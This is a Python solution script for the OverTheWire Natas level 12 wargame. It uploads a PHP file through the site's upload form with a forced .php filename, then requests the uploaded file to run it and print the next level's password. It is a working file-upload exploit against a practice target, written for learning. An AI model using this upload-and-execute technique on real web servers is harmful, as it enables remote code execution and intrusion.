import re
from requests import request as req

with open("./solve.php") as f:
    solve = f.read().encode()

auth = ("natas12", "yZ...eB")
url = "http://natas12.natas.labs.overthewire.org"


def file_upload():

    res = req(
        url=f"{url}/index.php",
        auth=auth,
        method="POST",
        data={
            "filename": "solve.php",
        },
        files={
            "uploadedfile": solve,
        },
    )

    matched = re.search("upload/[a-z0-9]{10}.php", res.text)

    return matched.group() if matched else "NOT UPLOADED"


def get_flag(upload_path: str):
    """
    flag 받아오기
    """
    res = req(
        url=f"{url}/{upload_path}",
        auth=auth,
        method="GET",
    )

    return res.text


def main():
    upload_path = file_upload()
    if upload_path != "NOT UPLOADED":
        flag = get_flag(upload_path)
        print(flag)


main()
